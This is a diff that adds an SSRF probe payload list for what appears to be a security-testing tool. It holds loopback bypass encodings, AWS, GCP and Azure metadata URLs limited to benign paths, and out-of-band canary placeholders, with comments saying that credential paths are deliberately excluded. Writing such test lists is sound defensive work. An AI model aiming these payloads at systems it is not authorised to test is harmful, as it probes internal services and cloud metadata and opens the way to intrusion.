@@ -1,0 +1,40 @@
+# ssrf-payloads.txt
+# SSRF probe targets. Loopback/IP-encoding bypasses point the target at its own
+# internal surface; metadata entries use ONLY benign paths.
+#
+# SAFETY: the AWS IAM security-credentials path
+#   (/latest/meta-data/iam/security-credentials/...) is intentionally EXCLUDED.
+# Retrieving live cloud credentials is active credential theft and a separate,
+# human-gated escalation -- this skill proves IMDS reachability with harmless
+# paths (instance-id, the meta-data index) and stops there.
+# file:// and gopher:// internal-exploitation schemes are intentionally absent.
+#
+# One payload per line; '#'/blank ignored. '{OOB}' is replaced with a per-test
+# canary host for blind detection. For a broader manual set see SecLists SSRF.
+
+# --- loopback / bypass encodings (the app's own 127.0.0.1) ---
+http://127.0.0.1/
+http://127.0.0.1:80/
+http://localhost/
+http://127.1/
+http://0x7f000001/
+http://2130706433/
+http://[::1]/
+http://0177.0.0.1/
+http://127.0.0.1.nip.io/
+
+# --- cloud metadata (benign paths only) ---
+# AWS IMDSv1 (v2 needs a token header that pure-URL SSRF cannot set)
+http://169.254.169.254/latest/meta-data/
+http://169.254.169.254/latest/meta-data/instance-id
+http://169.254.169.254/latest/meta-data/ami-id
+http://169.254.169.254/latest/dynamic/instance-identity/document
+# GCP (needs Metadata-Flavor header; host-reachability probe)
+http://metadata.google.internal/computeMetadata/v1/instance/hostname
+http://169.254.169.254/computeMetadata/v1/instance/
+# Azure (needs Metadata:true header; host-reachability probe)
+http://169.254.169.254/metadata/instance?api-version=2021-02-01
+
+# --- blind OOB (canary substituted at runtime) ---
+http://{OOB}/
+https://{OOB}/
